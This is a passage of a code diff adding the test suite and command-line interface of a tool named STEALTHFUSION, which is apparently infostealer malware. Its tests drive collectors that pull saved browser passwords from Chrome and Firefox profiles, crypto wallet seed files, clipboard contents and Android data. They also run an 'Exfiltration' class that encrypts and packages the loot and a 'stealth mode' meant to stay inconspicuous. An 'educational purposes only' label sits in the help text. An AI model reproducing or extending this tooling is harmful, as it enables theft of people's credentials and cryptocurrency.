+        collector = ClipboardCollector(self.config)
+        clipboard_data = collector.collect_clipboard()
+        
+        return (isinstance(clipboard_data, dict) and 
+                clipboard_data.get("content") and 
+                clipboard_data.get("hash"))
+    
+    def test_android_collector(self) -> bool:
+        """Test AndroidCollector functionality"""
+        # Skip if ADB is not available
+        try:
+            subprocess.run(['adb', '--version'], capture_output=True, timeout=5)
+        except:
+            logger.warning("ADB not available, skipping AndroidCollector test")
+            return True
+            
+        collector = AndroidCollector(self.config)
+        packages = collector.collect_android_data()
+        
+        return isinstance(packages, list)
+    
+    # ===== INTEGRATION TESTS =====
+    
+    def test_browser_integration(self) -> bool:
+        """Test browser data collection integration"""
+        # Test with mock browser data
+        test_data = {
+            "browsers": {
+                "chrome": [self.config.temp_dir / "mock_chrome_profile"],
+                "firefox": [self.config.temp_dir / "mock_firefox_profile"]
+            }
+        }
+        
+        # Create mock profiles
+        for browser, paths in test_data["browsers"].items():
+            for path in paths:
+                path.mkdir(exist_ok=True)
+                
+                if browser == "chrome":
+                    # Create Chrome mock data
+                    login_data = path / "Login Data"
+                    conn = sqlite3.connect(login_data)
+                    cursor = conn.cursor()
+                    
+                    cursor.execute("""
+                        CREATE TABLE logins (
+                            origin_url TEXT,
+                            username_value TEXT,
+                            password_value BLOB
+                        )
+                    """)
+                    
+                    cursor.execute("""
+                        INSERT INTO logins 
+                        (origin_url, username_value, password_value)
+                        VALUES (?, ?, ?)
+                    """, ("https://google.com", "testuser", b"testpass"))
+                    
+                    conn.commit()
+                    conn.close()
+                
+                elif browser == "firefox":
+                    # Create Firefox mock data
+                    logins_json = path / "logins.json"
+                    with logins_json.open('w') as f:
+                        json.dump({
+                            "logins": [{
+                                "hostname": "https://google.com",
+                                "username": "testuser",
+                                "password": "testpass"
+                            }]
+                        }, f)
+        
+        # Test collection
+        collector = BrowserCollector(self.config)
+        logins = collector.extract_logins()
+        
+        # Verify results
+        if not isinstance(logins, list) or not logins:
+            return False
+        
+        # Cleanup
+        for path in test_data["browsers"].values():
+            for p in path:
+                shutil.rmtree(p, ignore_errors=True)
+        
+        return True
+    
+    def test_wallet_integration(self) -> bool:
+        """Test wallet data collection integration"""
+        mock_wallet_path = self.config.temp_dir / "mock_exodus_wallet"
+        mock_wallet_path.mkdir()
+        seed_file = mock_wallet_path / "seed.seco"
+        seed_file.write_bytes(b"test seed data")
+        
+        self.config.crypto_wallets["exodus"] = [mock_wallet_path]
+        
+        collector = WalletCollector(self.config)
+        wallets = collector.extract_wallet_data()
+        
+        shutil.rmtree(mock_wallet_path)
+        
+        return isinstance(wallets, list) and len(wallets) > 0
+    
+    def test_system_integration(self) -> bool:
+        """Test system info collection integration"""
+        collector = SystemCollector(self.config)
+        system_info = collector.collect_system_info()
+        
+        return (isinstance(system_info, dict) and 
+                len(system_info) >= 5 and 
+                system_info.get("timestamp"))
+    
+    # ===== PERFORMANCE TESTS =====
+    
+    def test_collection_performance(self) -> PerformanceMetrics:
+        """Test data collection performance"""
+        start_time = time.time()
+        memory_before = psutil.Process().memory_info().rss / (1024 * 1024)  # MB
+        
+        # Run collection
+        data = Exfiltration.collect_all(self.config)
+        
+        memory_after = psutil.Process().memory_info().rss / (1024 * 1024)
+        cpu_usage = psutil.cpu_percent(interval=1)
+        collection_time = time.time() - start_time
+        
+        # Calculate data size
+        data_size = len(json.dumps(data).encode('utf-8')) / 1024  # KB
+        
+        return PerformanceMetrics(
+            collection_time=collection_time,
+            memory_usage=memory_after - memory_before,
+            cpu_usage=cpu_usage,
+            data_size=data_size
+        )
+    
+    def test_encryption_performance(self) -> PerformanceMetrics:
+        """Test encryption performance"""
+        start_time = time.time()
+        memory_before = psutil.Process().memory_info().rss / (1024 * 1024)  # MB
+        
+        test_data = b"test data" * 1000000  # 1MB test data
+        key = Fernet.generate_key()
+        encrypted = SecurityUtils.encrypt_data(test_data, key)
+        
+        memory_after = psutil.Process().memory_info().rss / (1024 * 1024)
+        cpu_usage = psutil.cpu_percent(interval=1)
+        collection_time = time.time() - start_time
+        
+        return PerformanceMetrics(
+            collection_time=collection_time,
+            memory_usage=memory_after - memory_before,
+            cpu_usage=cpu_usage,
+            data_size=len(encrypted) / 1024  # KB
+        )
+    
+    def test_memory_usage(self) -> PerformanceMetrics:
+        """Test memory usage during collection"""
+        start_time = time.time()
+        memory_before = psutil.Process().memory_info().rss / (1024 * 1024)  # MB
+        
+        # Run minimal collection
+        collector = SystemCollector(self.config)
+        data = collector.collect_system_info()
+        
+        memory_after = psutil.Process().memory_info().rss / (1024 * 1024)
+        cpu_usage = psutil.cpu_percent(interval=1)
+        collection_time = time.time() - start_time
+        
+        return PerformanceMetrics(
+            collection_time=collection_time,
+            memory_usage=memory_after - memory_before,
+            cpu_usage=cpu_usage,
+            data_size=len(json.dumps(data).encode('utf-8')) / 1024  # KB
+        )
+    
+    # ===== END-TO-END TESTS =====
+    
+    def test_full_collection_workflow(self) -> bool:
+        """Test complete collection workflow"""
+        # Run collection
+        data = Exfiltration.collect_all(self.config)
+        if not data:
+            return False
+        
+        # Save data
+        output_path = Exfiltration.save_data(data, self.config)
+        if not output_path.exists():
+            return False
+        
+        # Verify data
+        try:
+            with zipfile.ZipFile(output_path) as zipf:
+                with zipf.open("metadata.json") as f:
+                    metadata = json.load(f)
+            
+            if not isinstance(metadata, dict) or metadata.get("version") != VERSION:
+                return False
+        except:
+            return False
+        
+        # Cleanup
+        if self.config.cleanup:
+            output_path.unlink()
+        
+        return True
+    
+    def test_analysis_workflow(self) -> bool:
+        """Test data analysis workflow"""
+        # Mock collection data
+        mock_data = {
+            "logins": [{
+                "browser": "chrome",
+                "url": "https://google.com",
+                "username": "testuser",
+                "password": SecurityUtils.obfuscate_string("testpass")
+            }],
+            "system_info": {
+                "platform": str(self.config.platform)
+            }
+        }
+        
+        output_path = Exfiltration.save_data(mock_data, self.config)
+        
+        try:
+            with zipfile.ZipFile(output_path) as zipf:
+                with zipf.open("data.enc") as f:
+                    encrypted_data = f.read()
+                
+                decrypted_data = SecurityUtils.decrypt_data(encrypted_data, self.config.encryption_key)
+                loaded_data = json.loads(decrypted_data.decode('utf-8'))
+                
+                if loaded_data != mock_data:
+                    return False
+        except:
+            return False
+        finally:
+            if output_path.exists():
+                output_path.unlink()
+        
+        return True
+    
+    def test_exfiltration_workflow(self) -> bool:
+        """Test exfiltration workflow"""
+        data = Exfiltration.collect_all(self.config)
+        output_path = Exfiltration.save_data(data, self.config)
+        
+        if not output_path.exists():
+            return False
+        
+        try:
+            with zipfile.ZipFile(output_path) as zipf:
+                if "data.enc" not in zipf.namelist() or "metadata.json" not in zipf.namelist():
+                    return False
+        except:
+            return False
+        finally:
+            if output_path.exists():
+                output_path.unlink()
+        
+        return True
+    
+    # ===== SECURITY TESTS =====
+    
+    def test_encryption_security(self) -> bool:
+        """Test data encryption security"""
+        test_data = {"test": "data"}
+        test_data_bytes = json.dumps(test_data).encode('utf-8')
+        
+        # Generate key
+        key = Fernet.generate_key()
+        
+        # Encrypt
+        encrypted = SecurityUtils.encrypt_data(test_data_bytes, key)
+        
+        # Verify encryption
+        if encrypted == test_data_bytes:
+            return False
+        
+        # Verify decryption with correct key
+        decrypted = SecurityUtils.decrypt_data(encrypted, key)
+        if decrypted != test_data_bytes:
+            return False
+        
+        # Verify decryption fails with wrong key
+        wrong_key = Fernet.generate_key()
+        try:
+            SecurityUtils.decrypt_data(encrypted, wrong_key)
+            return False  # Should raise exception
+        except:
+            pass
+        
+        return True
+    
+    def test_data_cleanup(self) -> bool:
+        """Test data cleanup functionality"""
+        test_file = self.config.temp_dir / "test_cleanup.txt"
+        test_file.write_text("test data")
+        
+        Exfiltration.cleanup(self.config)
+        
+        return not test_file.exists()
+    
+    def test_stealth_mode(self) -> bool:
+        """Test stealth mode functionality"""
+        self.config.stealth_mode = True
+        
+        # Create mock process
+        process = psutil.Process()
+        
+        # In stealth mode, memory usage should be minimal
+        memory_before = process.memory_info().rss / (1024 * 1024)  # MB
+        data = Exfiltration.collect_all(self.config)
+        memory_after = process.memory_info().rss / (1024 * 1024)  # MB
+        
+        memory_diff = memory_after - memory_before
+        return memory_diff < 10  # Less than 10MB increase
+
+# ===== CLI INTERFACE =====
+
+class CLI:
+    """Command Line Interface for STEALTHFUSION"""
+    
+    @staticmethod
+    def parse_args():
+        """Parse command line arguments"""
+        parser = argparse.ArgumentParser(
+            description="STEALTHFUSION vPro - Advanced Automated Intelligence Framework",
+            epilog="FOR EDUCATIONAL PURPOSES ONLY"
+        )
+        
+        parser.add_argument('--test', action='store_true', 
+                          help='Run all tests')
+        parser.add_argument('--collect', action='store_true', 
+                          help='Run full data collection')
+        parser.add_argument('--output', type=str, 
+                          help='Output directory for collected data')
+        parser.add_argument('--stealth', action='store_true', 
+                          help='Enable stealth mode')
+        parser.add_argument('--clean', action='store_true', 
+                          help='Clean up temporary files')
+        parser.add_argument('--verbose', action='store_true', 
+                          help='Enable verbose logging')
+        
+        return parser.parse_args()
+    
+    @staticmethod
+    def main():
+        """Main CLI entry point"""
+        args = CLI.parse_args()
+        config = Config()
+        
+        if args.verbose:
+            logging.getLogger().setLevel(logging.DEBUG)
+        
+        if args.stealth:
+            config.stealth_mode = True
+            logger.info("Stealth mode enabled")
+        
+        if args.test:
+            logger.info("Running test suite...")
+            TestFramework(config).run_all_tests()
+        
+        if args.collect:
+            logger.info("Starting data collection...")
+            data = Exfiltration.collect_all(config)
+            output_path = Exfiltration.save_data(data, config)
+            logger.info(f"Data saved to: {output_path}")
+        
+        if args.clean:
+            logger.info("Cleaning up...")
+            Exfiltration.cleanup(config)
+            logger.info("Cleanup completed")
+
+# ===== MAIN TEST RUNNER =====
+
+def run_tests():
+    """Main function to run all tests"""
+    # Create test configuration
+    test_config = Config(test_mode=True)
+    
+    # Initialize test framework
+    test_framework = TestFramework(test_config)
+    
+    # Run all tests
+    test_framework.run_all_tests()
+
+# ===== MAIN APPLICATION =====
+
+if __name__ == "__main__":
+    try:
+        CLI.main()
+    except KeyboardInterrupt:
+        logger.info("Operation cancelled by user")
+        Exfiltration.cleanup()
+        sys.exit(1)
+    except Exception as e:
+        logger.error(f"Unexpected error: {str(e)}")
+        Exfiltration.cleanup()
+        sys.exit(1)
